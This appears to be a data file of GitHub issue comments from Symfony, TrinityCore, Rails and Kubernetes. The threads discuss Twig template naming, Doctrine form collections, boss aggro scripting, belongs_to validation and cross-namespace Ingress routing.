symfony/symfony/3150/3556232,"well, the point is that Twig could be able to include an HTML file using {% include %} it is a valid Twig template (without any logic in it at all). But it needs to have a name able to be handled by the loader registered in Twig. As a template name needs to be unique (it is the identifier to find the template), Symfony2 use a naming scheme which includes the bundle name to avoid collisions. And as it supports using several engines, it uses the extension to find the appropriate engine when rendering the template and so enforces such naming (the extension is used to find the engine so Twig templates needs to end with .twig). @friend regarding including .inc.php files in the templates, it makes no sense at all. It would kill totally the fact that Twig does not allow running arbitrary PHP code. ",,False,False,3150
symfony/symfony/3150/3559304,What about an exception in the template name parser if the name isnt correct? Ran into this issue when using twig to render templates for emails. ,,False,False,3150
symfony/symfony/3150/3559381,@friend this would make the loader unusable within a ChainLoader. The error message in Twig could probably be improved though to mention that it searches the template by name. ,,False,False,3150
symfony/symfony/3150/3560618,"@friend it actually does but then uses a regular Twig loader to look for the file. @friend this means that what you are looking for is possible out of the box. You have to create a template loader service (i.e. ), add the paths (by calling ) and configure the templating system to use this loader. ",,False,False,3150
symfony/symfony/3150/3563042,"@friend thank you for the hint. This is peanuts for me, but far to complex for a simple user. And I ""emulate"" many times a simple user, because I'm simply to ""lazy"" to make such effort where a simple config option would do the work. That's why I use a framework to reduce effort. Now, the main thing here is the core developers should listen to the user expectations, thus the default behavior is near-to-user-expectations. I understand the technical limitations, but there are possible solutions a) Clarify the error message to something like ""please use template name, e.g. ""page.html.twig"" or ""YourBundlepage.html.twig"" and ensure it has valid extension which referes to the template engine (.twig, ...)"". b) Provide a configuration option ""allow_raw_includes"", which handles unspecified templates (.html) c) Provide a construct like this {% include file='global_right.html' %}  d) Provide a construct like this {% include_raw 'global_right.html' %}  Which directions (a/b/c/d) would be the most possible to be accepted for inclusion into the main code? ",,False,False,3150
symfony/symfony/3150/3563185,"@friend The error message is thrown by Twig. So it cannot include stuff related only to the Symfony2 loader (other loaders will have different patterns for valid template names) And loading a file relatively to the current template location would require changing totally the way Twig works (removing most of the possibilities for the loader) as currently a template itself never knows where it is stored (not even if it is stored in a file, or stored at all as there is a StringLoader btw). So you cannot find something relatively to this location. ",,False,False,3150
symfony/symfony/3150/3563963,"Let's clarify this issue (look at the FileSytemLoader) When you try use a template which name pattern differs from  then you will fallback to the Twig Loader. So as of today the error message is not so bad it assumes you are not using the symfony syntax so it only print that the file could not be found. May be there is a little room for improvement by adding more precision to the error message, something like ""Either you have specified an invalid template name or the template can not be found"". ",,False,False,3150
symfony/symfony/3150/3565218,"@friend, can you please for one moment stop thinking that there are no other developers which can overcome those (peanuts-) issues? There are people capable of seeing solutions and paths where you just see problems and barriers. And of course there's another thing we're not talking about a control-software for a nuclear plant. It's a simple framework. So, hypothetically, which directions (a/b/c/d) would be the most possible to be accepted for inclusion into the main code? (if they overcome any possible problems you mention). ",,False,False,3150
symfony/symfony/3150/3568550,"@friend - you take existent code as a foundation to analyze the issue. I take user expectations as a foundation, and really don't care about the code. I've enough with this error message. To be blunt it's crap! ",,False,False,3150
symfony/symfony/3150/3568924,I see no issue - at least not in the framework. ,,False,False,3150
symfony/symfony/3150/3569512,"You're not the only one who does not see the issue / issues. And that's in essence the main issue. Hopefully I get at least the hypothetical answer, thus I can go on. ",,False,False,3150
symfony/symfony/3150/3605572,"@friend well the problem with your expectations is that you want a ""do as i think"" system. in order to provide what you need, we would need to simply the out of the box possibilities. aka if we dumb the system down, we could figure out what you want. but as with the current flexibility you could have any number of possibilities. as noted however there are two solutions that could move things closer to your desired behavior 1) add handling for ""raw html"" to twig 2) add a ""raw html"" template engine option to the framework bundle finally some advice to you work on your attitude. ",,False,False,3150
symfony/symfony/3150/3726925,"@friend My attitude? The only attitude which has to change is this of the Symfony2 team agianst the userbase. Sorry, users (especially the one who contacted me in privat), as you see I'm forced to do development locally. ",,False,False,3150
symfony/symfony/3150/3727880,@friend lsmith77 told you how to add support for your feature. Now you you could implement it and share your work with the community via PR. No need to rant. ,,False,False,3150
symfony/symfony/3150/3735146,"@friend could you please come down ) The system is flexible and implemented this way to support more than one templating engine. If we where to do what you want, the system would not be flexible enough to support Smarty or any other engine. As several of other members of the community have stated here, it is possible for you to implement the  twig tag yourself and even share it with the world through a bundle. There is nothing that forces you to develop this locally especially if other will benefit from it. Lastly. I aswell must advice your to adjust your attitude. Symfony2 is FREE and developed by people mostly in their sparetime. Some of us are lucky enough to work with it in our day to day life but that is far from true for all. Have a nice day! ",,False,False,3150
symfony/symfony/3150/3811747,"@friend once more implementing it is peanuts, that it get's into the code is another thing. The team usually ignores PR's, even issues subjecting defects in coding-standards  get serious, please. At least all other people have spared me this typical Open-Source whining thing. ",,False,False,3150
symfony/symfony/3150/6876224,closing as a duplicate of #3696 ,,False,False,3150
TrinityCore/TrinityCore/20714/268463888,"Description If I am inside Naxxramas, I can pull one of Anub'rekhan's Crypt Guards without aggroing the other Crypt Guard or Anub'rekhan himself. Current behaviour It is possible to aggro only Anub'rekhan or one of the Crypt Guards if we aggro them from the side. Expected behaviour Pulling any of the Crypt Guards or Anub'rekhan himself will result in all of them getting aggroed. Steps to reproduce the problem  CHANGEME Step 1 include entries of affected creatures / items / quests with a link to the relevant wowhead page.   Step 2 Step 3  Branch(es) 3.3.5, I don't know which branch TC rev. hash/commit TrinityCore rev. 607034064f04 2017-10-07 171334 +0200 (3.3.5 branch) (Win64, RelWithDebInfo, Static) (authserver) TDB version  TDB_full_world_335.63_2017_04_18 Operating system Windows 10 ",,False,False,20714
TrinityCore/TrinityCore/20714/339509838,"Is it normal, Crypt Guards appears only on 25man? ",,False,False,20714
TrinityCore/TrinityCore/20714/339548877,"So I should post the top one which you said will work in the querry, or will it be updated in the official TC? ",,False,False,20714
TrinityCore/TrinityCore/20714/339630414,"One more thing @friend, the query you added does work if Anub'rekhan is pulled first, however it does not work if his Crypt Guards are pulled first, I can still pull each one of them from the side, kill them and then engage the boss without adds at the start. ",,False,False,20714
TrinityCore/TrinityCore/20714/339675415,"No this must be fixed in core side, also when you pull the boss a set combat with zone is called and the 2 guards will enter the combat. ",,False,False,20714
TrinityCore/TrinityCore/20714/339741989,Maybe @friend would like to pick up the challenge to see if he can find out what can be done about that action in the SAI core source? ,,False,False,20714
TrinityCore/TrinityCore/20714/339761062,"It would be incredible if someone could start working on this issue, since it creates a lot of problem in MC and sub-raids on my server which is  hosting vanilla as end-game content, is there a forum where I can ask some more complicated questions about TC? ",,False,False,20714
TrinityCore/TrinityCore/20714/339777498,"Was digging into this issue earlier, call for help only works when creature has a victim so its kinda buggy for some reason when used with aggro event (didnt have time to check why, through) You can use SET_IN_COMBAT_WITH_ZONE (38) with target CREATURE_GUID (10), but it may be a bit of a hack. ",,False,False,20714
TrinityCore/TrinityCore/20714/339779850,The easiest way is to delay the call of help by 1 secs. ,,False,False,20714
TrinityCore/TrinityCore/20714/339780206,@friend I think thats even more hacky solution than mine tho D ,,False,False,20714
TrinityCore/TrinityCore/20714/339781268,"@friend maybe not - it might sound strange, but in some of my almost expired memories from WotLK retail I recall creatures waiting 1-2 seconds before answering a call for help P ",,False,False,20714
TrinityCore/TrinityCore/20714/339783296,"@friend alright, fair enough, still weird tho ",,False,False,20714
TrinityCore/TrinityCore/20714/339788384,Yes it makes sense the text is displayed then after 1-2 secs npcs will enter combat. ,,False,False,20714
TrinityCore/TrinityCore/20714/339793137,"Just put call of combat with boss, when Crypt Guards enter in combat (you can do it using EnterCombat(Unit* who) in a ScriptedAI) ",,False,False,20714
TrinityCore/TrinityCore/20714/339795251,Yes but in this case the SAI action mut be fixed. ,,False,False,20714
TrinityCore/TrinityCore/20714/339929719,Will an issue like this be fixed in the 3.3.5 branch or will I have to do this manually? ,,False,False,20714
TrinityCore/TrinityCore/20714/339969755,"Ideally it will be fixed in the TC source (3.3.5 / master), but it depends on someone coming up with a working solution. ",,False,False,20714
TrinityCore/TrinityCore/20714/339974429,"One solution would be to add second optional parameter victim to CreatureCallForHelp. If noone comes up with better solution, I will open a PR with it. ",,False,False,20714
TrinityCore/TrinityCore/20714/340289990,Why nobody talks about formations? D ,,False,False,20714
TrinityCore/TrinityCore/20714/340290080,"Sometimes you can't put creatures into formations like when they already are in one or, in this case, they're temporary summons ",,False,False,20714
TrinityCore/TrinityCore/20714/340290650,"That's why I had a feeling that I am stupid and missed something, because four days and nobody's talking about formations.. there must be a reason. ",,False,False,20714
TrinityCore/TrinityCore/20714/340526812,"I'm new to Trinity, but how many people are working on it? ",,False,False,20714
TrinityCore/TrinityCore/20714/340597626,"Since working implies, by definition, some sort of revenue, 0 ",,False,False,20714
TrinityCore/TrinityCore/20714/340667289,"Yes, it all depends on how you define ""working"" or what you actually want to know. There is a certain number of members in the TrinityCore organization, but some are inactive and some are more active than others. And like ccrs said, none of them receive a salary. ",,False,False,20714
TrinityCore/TrinityCore/20714/415158337,"If you wanna pay me a full-time job I'll gladly work on this silly project. Until then, you get fixes when they happen. ",,False,False,20714
TrinityCore/TrinityCore/20714/415166860,closed by 79f0e55 ,,False,False,20714
TrinityCore/TrinityCore/20714/415585161,"Apologies for the attitude in the past @friend , I didn't want to come off that way, I'm very grateful for the fix! ",,False,False,20714
rails/rails/31437/281929378,"If child association will fail on its validation rules then I receive ActiveRecordNotNullViolation after parent save In this case, belongs_to validation doesn't work ",,False,False,31437
rails/rails/31437/351740685,"I tried but couldn't reproduce the issue, can you please try to provide an executable reproduction script by using the information given in this page? ",,False,False,31437
rails/rails/31437/351884253,"frozen_string_literal true begin   require ""bundler/inline"" rescue LoadError =&gt; e   $stderr.puts ""Bundler version 1.10 or later is required. Please update your Bundler""   raise e end gemfile(true) do   source "" { |repo| "" } Activate the gem you are reporting the issue against. gem ""activerecord"", ""5.1.4""   gem ""sqlite3"" end require ""active_record"" require ""minitest/autorun"" require ""logger"" Ensure backward compatibility with Minitest 4 MinitestTest = MiniTestUnitTestCase unless defined?(MinitestTest) This connection will do for database-independent bug reports. ActiveRecordBase.establish_connection(adapter ""sqlite3"", database ""memory"") ActiveRecordBase.logger = Logger.new(STDOUT) ActiveRecordSchema.define do   create_table companies, force true do |t|     t.string name   end create_table owners, force true do |t|     t.references company, foreign_key true, null =&gt; false   end end class Company &lt; ActiveRecordBase   validates name, presence true, length { in 2..4 } end class Owner &lt; ActiveRecordBase   belongs_to company end class BugTest &lt; MinitestTest   def test_association_stuff     owner = Owner.new     owner.company = Company.new( { name ""too long name"" } )     owner.save   end end ",,False,False,31437
rails/rails/31437/351964089,"There is no issue with rails. If you try with  option in your owner model it works. But why? The thing is if you don't set  to true then Active Record does not try to save the company relation and since you have not null constraint in your database it raises the exception. What happens when you set  to true is, Active Record tries to save relation but first checks the validations and because of the validation error it rolls back. ",,False,False,31437
rails/rails/31437/351977405,"I can't agree with your answer... If Company model data will be correct (name length in 2..4) then company will be saved (without this option). belongs_to property (without optional flag) should care that relationship exists, without raising exception on database level! According to documentatin, autosave flag is for different purpose (for saving in update action). ",,False,False,31437
rails/rails/31437/351990455,"This is from the documentation, which means no matter whether its an update or insert or delete. But here I see that there is an issue with the rails in autosave module. Since the owner belongs to company while saving owner the company should be saved as well so this is what Active Record is trying to do. By default rails saves associated records if they are new records even though the autosave option is not set, kind of an implicit autosave. If you want a workaround you can set  to true till this issue is getting fixed. ",,False,False,31437
rails/rails/31437/351998099,"Without  flag company is also saved (as you said - implicit save). In my opinion autosave = true should be as default option. When autosave = false, relationship shouldnt be saved. I really don't know why (without autosave option) model is not validated (because autosave is implicitly)? ",,False,False,31437
rails/rails/31437/352003703,"With or without autosave the parent model is validated. The only difference is when autosave option set as true, the validation failures rollback the transaction. If it's not set, it just ignores the validation error on parent model and tries to save object. As far as I see from the code and test cases, this was done in purpose which does not make sense to me. If the relation is , parent record validation should rollback the entire transaction, otherwise it leads to data integrity issues. In your case since you have not null constraint in database layer, database saves your life but the application itself should have this protection as well. I'll try to fix this behaviour but I can't guarantee it will be merged since I don't know what the Rails team will think and this is kind of a breaking change. ",,False,False,31437
rails/rails/31437/352006529,"Yes, I fully agreed with you. Database exceptions should be the last way for keeping data consistency ) Thanks for your support. Please update this topic if you will have any news about this. ",,False,False,31437
rails/rails/31437/357386872,and? ,,False,False,31437
rails/rails/31437/357645951,Sorry I was on vacation therefore couldn't find time to have a look at this. Maybe someone from Rails core team can give some opinion about the issue. \cc @friend ,,False,False,31437
rails/rails/31437/359771601,and what do Rails team think? We spent some time to investigate and will be stupid to allow to this subject ,,False,False,31437
rails/rails/31437/370204670,This is not an issue. Please close. ,,False,False,31437
rails/rails/31437/370219229,"not issue, really? Please explain. ",,False,False,31437
rails/rails/31437/373141639,@friend   and ?? ,,False,False,31437
rails/rails/31437/376331864,@friend  and ? ,,False,False,31437
rails/rails/31437/378776720,Please can you avoid bumping the issue. Rails is made by volunteers and they usually work in work they are interested. If this issue is so important to you please do investigate a try to open a pull request with the fix. ,,False,False,31437
rails/rails/31437/381195626,"I asked why not issue, so is it or not? One volunteer confirmed that sth is wrong and why should I forget about it? ",,False,False,31437
rails/rails/31437/381220086,"I already said there is a problem and mentioned one of the Rails members. Since the issue is not closed by one of them, you can assume that they recognize this as an issue so there is nothing you can do other than waiting for some one to take a stab on the issue or you can come up with a pull request to address the problem. Actually the second option is better than harassing people through a platform where people try to help each other. If you can't come up with a fix, please at least stop pinging the issue, this kind of attitude(it's really annoying to me) does not help, it contrarily keeps away people from involving with the issue. ",,False,False,31437
rails/rails/31437/404707615,"This issue has been automatically marked as stale because it has not been commented on for at least three months. The resources of the Rails team are limited, and so we are asking for your help. If you can still reproduce this error on the  branch or on , please reply with all of the information you have about it in order to keep the issue open. Thank you for all your contributions. ",,False,False,31437
symfony/symfony/3201/2998652,"When using entity's in Doctrine with one-many relationships using a form collection, Symfony does not assign the parent entity to the child entity. Using 'by_reference' =&gt; false with cascade-persist fails and the child entity's foreign key is null in the database. The following appears to remedy the issue within the set method which accepts an ArrayCollection within the entity. Surely Symfony should do this within bindRequest in the form itself? ",,False,False,3201
symfony/symfony/3201/3693492,"The form component does not know anything about Doctrine, which has a requirement to update the owning side of the relation. Btw, if you don't set the hub when adding a link, it will always fail to add it. This is why it is recommended to do -&gt;setHub() in the setter of the inversed side. This is a Doctrine requirement which is documented in the doctrine doc about relations. altering the Symfony form component for such cases is wrong as it would couple it to Doctrine (to be able to detect inversed-side of relations) Btw, this requirement is one of the reason why the code generated by the EntityGenerator should be considered as a starting point for the entities, not as a ready-to-be-used-blindly code. ",,False,False,3201
symfony/symfony/3201/3693807,"Hey Christophe, I'm aware of the need to set the hub in Doctrine as I've used it outside of Symfony, however the documentation doesn't make it clear that you need to do this. The assumption is (based on the Symfony documentation) that you do not need to set the the owning side of the relationship explicitly and that Symfony will handle this for you... I would be happy to update this for you to avoid confusion to new Symfony developers. ",,False,False,3201
symfony/symfony/3201/3693941,"Where does the Symfony2 doc tell you that it does some magic to allow you not to do stuff required by Doctrine in its documentation ? If it really says this, we need to change the doc. ",,False,False,3201
symfony/symfony/3201/3694121,"It doesn't, that's my point. Someone new to Symfony like me will assume that Symfony will handle all of this... as the documentation doesn't explain how Symfony and Doctrine handle this. from -  in the sample code in the cookbook, it doesn't mention that what you have to do to associate a tag with a task in order to persist it in Doctrine... ",,False,False,3201
symfony/symfony/3201/3694172,"The data are indeed transferred to the underlying object (check your hub object you were editing and it will have the links) But your underlying object is the inversed side of a relation so Doctrine does not track changes in it. the cookbook you linked explicitly talks about a ManyToMany relation, and in this case, the collection can be the owning side. ",,False,False,3201
symfony/symfony/3201/3694465,"I did, and it does send an ArrayCollection to the setLinks method. My problem is that Symfony only does half of the work and doesn't handle associating those links with the Hub by calling setHub($hub) on each Link that Symfony processes when the form is submitted. This results in a NULL value being inserted into the Links table for the hub_id. This now means that you have to explicitly add the association within the Doctrine Link entity by looping over each Link in the ArrayCollection passed to the setLinks method. I think this documentation clearly needs to be updated, if you read through the code, it's clear that this is a OneToMany relationship as getTasks and setTasks aren't even in the Tag entity. It's worth noting that this happens within our application and a vanilla install of Symfony, the same issue can be found here  however the solution doesn't seem to work for the current distro of Symfony ",,False,False,3201
symfony/symfony/3201/3694756,"Well, of course it does not call it. You are editing the Hub object in your form, and telling the Form component to access a links property (which is done using getLinks and setLinks). why should the form component assume that it it should do an inversed work on the objects ? It does not know how your objects works. Looping over the collection in the setLinks method is what Doctrine requires fot the inversed side. And regarding the cookbook entry, the note at the beginning *explicitly mentions a ManyToMany. And your remarks let me think you confuse what a ManyToMany relation is and what a bidirectional relation is. A ManyToMany does not need to be bidirectional. And even more, if it was a OneToMany, it would logically be the inversed side of a ManyToOne and in this case you would have to have a getTask and a setTask methods So no, it is absolutely not clear it is a OneToMany. ",,False,False,3201
symfony/symfony/3201/3694936,"Well I have to apologise to you then, me and my team are obviously stupid and misreading the Symfony documentation and haven't spent the last day or two trying to figure out why the Symfony documentation is so crap and not explicit with the way in which the Form component handles associations with Doctrine, something that other PHP frameworks are quite clear on. The fact that the Cookbook itself is incomplete says a lot, and your attitude towards people looking for support is even worse. Thanks a bunch! ",,False,False,3201
symfony/symfony/3201/3695016,"well, the cookbook is not incomplete. first, this one is not about Doctrine and second, Doctrine never requires using bidirectional relations everywhere  the form component does not handle anything ""with Doctrine"". It handles things with objects, whatever they are. It is totally decoupled from Doctrine. Best way to see it is to look at the code in the Symfony\Component\Form namespace there is not a single reference to code from the Doctrine namespace there. ",,False,False,3201
symfony/symfony/3201/3695239,"I don't mean to argue but at the bottom of the cookbook it clearly says. No it doesn't, but any developer (including my team) will look at those entity's and tell you that's it's not clear that it's a ManyToMany association/relationship. Even so, the example code is clearly using doctrine otherwise it wouldn't have  within the entity. What's the point of confusing a reader into thinking that Doctrine is not being used for this cookbook when it's clearly used as an example. Surely it makes sense given the fact that Doctrine is the prime ORM used for Symfony to at least have a cookbook showing how to do this specifically for Doctrine? ",,False,False,3201
symfony/symfony/3201/3695250,"The cookbook has been completed since, but the website is not yet regenerated. ",,False,False,3201
symfony/symfony/3201/3695260,I rest my case ,,False,False,3201
symfony/symfony/3201/3695398,I don't mean to sound out of place but... ,,False,False,3201
symfony/symfony/3201/3695450,"yeah, there is an issue when you don't use by_reference = false. But even if we fix it, you will still have to implement the update of the owning side for Doctrine. The issue when updating the collection by reference currently is that it does not call the setter at all ",,False,False,3201
symfony/symfony/3201/3695558,"Even with  it doesn't work. It's clear that the issue here is the fact that the documentation doesn't match up to the expected behaviour from Symfony. So the docs need to be updated and be clear about what Symfony does and does not do in the interim. This will stop developers from smashing their heads against their screens trying to figure out why the expected behaviour isn't as it should be. I'm sure other people working on time sensitive projects will agree that if we know what Symfony does and does not do with Doctrine it will save time and prevent headaches. We've moved from Zend to Symfony over here and are gradually porting our much larger projects over to Symfony. It's a great framework and we love it, but the documentation is really lacking a little which is causing us a nightmare! ",,False,False,3201
symfony/symfony/3201/3695657,"well, with by_reference = false, it works when you do what Doctrine requires for its inversed side relations ",,False,False,3201
symfony/symfony/3201/3695919,"again, this should be clear in the Symfony documentation, especially when it comes with Doctrine integration as standard as well as having tutorials about using Symfony with Doctrine. My problem isn't with Symfony code, it's with the lack of documentation explaining how collections in forms work and what's expected of the developer to ensure that they persist correctly. ",,False,False,3201
symfony/symfony/3201/285966695,You can get the solution in this tutorial Good Work Link ,,False,False,3201
kubernetes/kubernetes/17088/116263695,As far as I can tell right now it's only possible to create an ingress to address services inside the namespace in which the Ingress resides. It would be good to be able to address services in any namespace. It's possible that I'm missing something and this is already possible - if so it'd be great if this was documented. ,,False,False,17088
kubernetes/kubernetes/17088/155917963,"Nope, not allowing this was a conscious decision (but one that I can be convinced against). Can you describe your use case? The beta model partitions users on namespace boundaries and disallows service sharing across namespaces. You might argue that you want a single loadbalancer for the entire cluster, to which I ask, what is in the namespaces? i.e why not use 1 namespace if you want to allow sharing. ",,False,False,17088
kubernetes/kubernetes/17088/155918432,"@friend I'm running multiple projects on a cluster - kubernetes tests, blog, API for a project. I want to address these as subdomains on my domain using a single ingress controller because load balancers and IP addresses are expensive on GCE. ",,False,False,17088
kubernetes/kubernetes/17088/156287304,It was intentionally avoided. Cross namespace references would be a prime source of privilege escalation attacks. cc @friend/kube-iam ,,False,False,17088
kubernetes/kubernetes/17088/157181041,"I'll close this for now, makes sense. ",,False,False,17088
kubernetes/kubernetes/17088/157187876,"FWIW you can set up a Service in namespace X with no selector and a manual Endpoints that just lists another Service's IP.  It's yet another bounce, but it seems to work. ) On Thu, Nov 12, 2015 at 514 PM, Jordan Liggitt notifications@friend.com wrote ",,False,False,17088
kubernetes/kubernetes/17088/157926226,I would tend to imagine the use case that @friend described is common.  I'm looking at an ingress controller as a system component and a means of reflecting any service in the cluster to the outside world.  Running one (perhaps even in the  namespace) that can handle ingress for all services just seems to make a lot of sense. ,,False,False,17088
kubernetes/kubernetes/17088/157927772,That depends on what you have in your namespaces right (which is why i asked for clarification)? Isn't it only risky IFF you're partitioning users across a namespace security boundry? ,,False,False,17088
kubernetes/kubernetes/17088/162258789,There seems to be demand for cross namespace ingress x service resolution. We should at least reconsider. ,,False,False,17088
kubernetes/kubernetes/17088/170397539,Might be good to revisit this now in 2016 ) ,,False,False,17088
kubernetes/kubernetes/17088/170955624,@friend/kube-iam thoughts/volunteers to implement an admission controller? Do we authorize based on the user field of a request today or is that unprecedented? ,,False,False,17088
kubernetes/kubernetes/17088/170960222,"I think I'd want some record or indication of the cross-namespace relationship to exist, so the targeted service could know it was exposed. I want to avoid the scenario where someone had access to a service (legitimately or otherwise), set up ingress from other namespaces, then had their access removed and continued accessing the services without the service owner's awareness. The authorization layer is based on the user info on a request. This would be the first objectref authorization I know of. ",,False,False,17088
kubernetes/kubernetes/17088/173379992,"@friend's raises some good concerns.  I broke them down into two cases when thinking about them.  assuming everyone is trustworthy, it might still be hard to reason about the network security of a service just by looking at the service object (or just by looking at objects in the same namespace).  IT might be misconfigured.  I agree with this, to a point however, creating an object that represents a connection between two services seems like it would scale poorly.   we need a solution that scales with the number of services, not the number of interconnections, I think.   assuming there is someone not-trustworthy, they can misconfigure they network in a way where the misconfiguration persists after some of their access is revoked. Yes.  But we have this problem worse with pods, configmap, etc.  The bad actor might have run pods that that are doing the wrong thing, and auditing this is very hard.    ",,False,False,17088
kubernetes/kubernetes/17088/173836967,"Is this moving into the topic of micro-segmentation and access policy? On Wed, Jan 20, 2016 at 219 PM, Eric Tune notifications@friend.com wrote ",,False,False,17088
kubernetes/kubernetes/17088/174039921,"The two main models proposed for network segmentation are 1) decorate Services (and maybe Pods) with a field indicting ""allow-from"". This basically allows one to draw the directed graph of an application, sort of. 2) implement a ""policy group"" object which selects Pods to which to apply policy, and includes some simple policy statements like ""allow-from"" On Thu, Jan 21, 2016 at 1152 PM, Tim Hockin notifications@friend.com wrote ",,False,False,17088
kubernetes/kubernetes/17088/174041517,@friend what issue does one go to to learn more and comment? ,,False,False,17088
kubernetes/kubernetes/17088/174042505,"It's being discussed in the network SIG mailing list as we haggle over multitudes of ideas and whittle it down to a few viable ones. Start here  proposal  is in email  Fri, Jan 22, 2016 at 1246 PM, Eric Tune notifications@friend.com wrote ",,False,False,17088
kubernetes/kubernetes/17088/174085075,"Talked to @friend and @friend  It sounds like the Ingress resource may undergo some refactoring this quarter, possibly splitting into two objects.  We should revisit ingress security when those discussion happen. ",,False,False,17088
kubernetes/kubernetes/17088/212615169,"This would be a nice feature to have.  For example, someone who wants to offer  a pseudo multi-tenant solution - with each tenant running in a separate namespace.  The ingress could do hostname based routing to the right backend namespace.   ${tenant}.example.com  -&gt;  service ""foo"" in namespace ${tenant} I suppose one can do this today on GKE, but I gather you end up with one HTTP load balancer per namespace  - which could get quite expensive and seems unnecessary. ",,False,False,17088
kubernetes/kubernetes/17088/221380052,"This limitation throws a big wrench in how my company was planning to use ingresses. Our use case is running multiple copies of the same application stack at different versions, and to keep the stacks isolated from each other, we use namespaces. We'd planned to run a single ingress controller that knows how to determine which applications and versions of those applications by the subdomain of the incoming requests. The reason for using namespaces for isolating these stacks are  To be extra safe about not having applications interfere with each other based on what else happens to be running in the cluster or from similarly named services. To get around name collisions for services. It's not possible to have two services in the same namespace with the same name, so application dependencies like ""redis"" or ""mysql"" need to be in different namespaces to use those simple names without faking a namespace by changing the name of the service.  See my unanswered Stack Overflow question, Kubernetes services for different application tracks, for more details on our use case. Our ingress controller is exposed to the outside world via NodePort (80 and 443), and we have an ELB in AWS pointing at the whole cluster. With the namespace restriction for ingresses, we'd need one ingress controller per namespace and there would be no way to have a single ELB forwarding ports 80 and 443 to the cluster. ",,False,False,17088
kubernetes/kubernetes/17088/221393102,"@friend You should use the approach that our group is using for Ingresses. Think of an Ingress not as much as a LoadBalancer but just a document specifying some mappings between URLs and services within the same namespace. An example, from a real document we use We make one of these for each of our namespaces for each track. Then, we have a single namespace with an Ingress Controller which runs automatically configured NGINX pods. Another AWS Load balancer points to these pods which run on a NodePort using a DaemonSet to run at most and at least one on every node in our cluster. As such, the traffic is then routed Internet -&gt; AWS ELB -&gt; NGINX (on node) -&gt; Pod We keep the isolation between namespaces while using Ingresses as they were intended. It's not correct or even sensible to use one ingress to hit multiple namespaces. It just doesn't make sense, given how they are designed. The solution is to use one ingress per each namespace with a cluster-scope ingress controller which actually does the routing. All an Ingress is to Kubernetes is an object with some data on it. It's up to the Ingress Controller to do the routing. See the document here for more info on Ingress Controllers. With this post I will close this issue because I think it's actually a non-issue - Ingresses work fine even for cross namespace routing. Eventually the ingress object might be refactored / split. That would be a redesign of this concept. But as of now, this is how Ingresses are designed and meant to be used, so it only makes sense to use them the ""right"" way ) ",,False,False,17088
kubernetes/kubernetes/17088/221395779,I might open up another issue about actually properly documenting this with examples. Seems there's some confusions around Ingresses. They're really powerful when applied correctly. ,,False,False,17088
kubernetes/kubernetes/17088/221410555,"I think your @friend was the wrong person. P I understand the difference between ingress resources and the ingress controller, but I'm not sure I understand why my use case is not appropriate here, or how the setup you describe does the same thing we're trying to do. In our imagined setup, the ingress controller and all ingress resources exist in one namespace. However, we create ingress resources that map host names to services in more than one namespace. This way we can access apps from outside the cluster as ""my-app.app-version.example.com"" and the request follows the path ELB ♢ random node ♢ ingress controller ♢ my-app in the my-app-my-version namespace. ",,False,False,17088
kubernetes/kubernetes/17088/221415444,"Yeah whoops. I just assumed the first jimmy in the @ list was you. There's absolutely no reason to have your ingress resources in one namespace, as far as I can tell. What's keeping you from putting the routes for your app into a single Ingress object and then replicating this object for each namespace you want to run? It just makes sense from a symmetry perspective - if every namespace has the same set of objects, including the ingress object, then everything will work properly... ",,False,False,17088
kubernetes/kubernetes/17088/221426073,"I don't think duplication of ingress objects would be a big deal, but needing an ingress controller for each namespace would be a problem, as we want to have a single entrypoint for requests going into the cluster. If each namespace had it's own ingress controller, we'd need a separate ELB with its own DNS records for each namespace, which is not something we want. ",,False,False,17088
kubernetes/kubernetes/17088/221440162,"@friend Read through my comment again. I said you would have a single ingress controller for the entire cluster, exactly as you want... ",,False,False,17088
kubernetes/kubernetes/17088/221442374,"It does look like I misunderstood what this issue was about! It sounds like ingress controllers do work across namespaces, but ingress resources cannot see outside of their own namespaces, which was the subject of this issue. Apologies for the confusion and thanks for your responses! ",,False,False,17088
kubernetes/kubernetes/17088/222218906,@friend I had the same confusion up to a point. ,,False,False,17088
kubernetes/kubernetes/17088/274069915,"I read this discussions many times and still do not understand what is the recommended way to achieve the desired goal of multiple sub/domains to be served from different namespaces. My first workaround is to use single namespace with Ingress for everything that should be exposed via domain name to the world. And the second way is to not use Ingress, but a simple Nginx as a proxy to my apps in different namespaces. Isn't the goal of Ingress to simplify this scenario? There is mentions about security implications if crossing the namespace. However, there is no simple explanation of them. @friend Could you please share more details about what are those pods, which reside with the Ingress Controller? ",,False,False,17088
kubernetes/kubernetes/17088/274549975,"I think I need to be able to reference services in different namespaces from a single ingress controller. My use-case is doing blue/green deployments, with a ""blue"" namespace and a ""green"" namespace. My application's public traffic comes via an ingress controller. I would like to be able to route that traffic to blue or green services via making a small change to the ingress controller (i.e. the service namespace). ",,False,False,17088
kubernetes/kubernetes/17088/274570596,"You're both still missing the point, you can use a single ingress controller for as many namespaces full of ingresses you want ",,False,False,17088
kubernetes/kubernetes/17088/274755613,"@friend Yes, I did understand that this is possible. What I am missing is how you do that? Does the controller receive events for ingress resource in every namespace, no matter in which namespace the controller resides in? ",,False,False,17088
kubernetes/kubernetes/17088/274987198,"And I was not understanding that when I weighed in on this way back when. Given my current understanding, I actually have come around to believing there's no issue or truly damning limitation here. ",,False,False,17088
kubernetes/kubernetes/17088/276326628,"@friend I believe I am the same as @friend in that I do not understand how to achieve my goal. Please let me explain. I am trying to implement the blue/green deployment pattern using ""blue"" and ""green"" as my namespaces - each namespace hosts my application stack at different versions. My desire is to have a single Ingress resource routing traffic for  to, e.g. the blue namespace, and then at the point of release, make a change to that Ingress so that now traffic is being routed to my green namespace (without the public IP of that Ingress changing). Unfortunately I believe all the solutions mentioned above require interaction with some entity outside of Kubernetes, e.g. an external load balancer, which is not desirable. If it helps, I'm on Google Container Engine. I hope now that we are on the same page? My problem is that if I believe that without a service namespace selector, I can't achieve what I want to achieve. ",,False,False,17088
kubernetes/kubernetes/17088/276405816,"@friend nope, still doable without a namespace selector. Remember that an ingress controller does not change ip between different ingress resources. It just combines them together and serves them. Try running the nginx controller for example, and setting up what you want. You can either use a different URL in one namespace, and then change it to the main URL when you want to enable that namespace (kubectl edit it) or you can write a little bash script that deletes the ingress object in one namespace and immediately recreates it in the other. The main thing I think you're missing is that the ingress objects are just data. Deleting them doesn't actually cause kubernetes to delete any resources. The ingress controller however is watching for changes to these resources and uses them to update its configuration. For the nginx controller this means updating the nginx.conf which does not change anything about how you chose to route traffic to the nginx pods. The IP remains the same. ",,False,False,17088
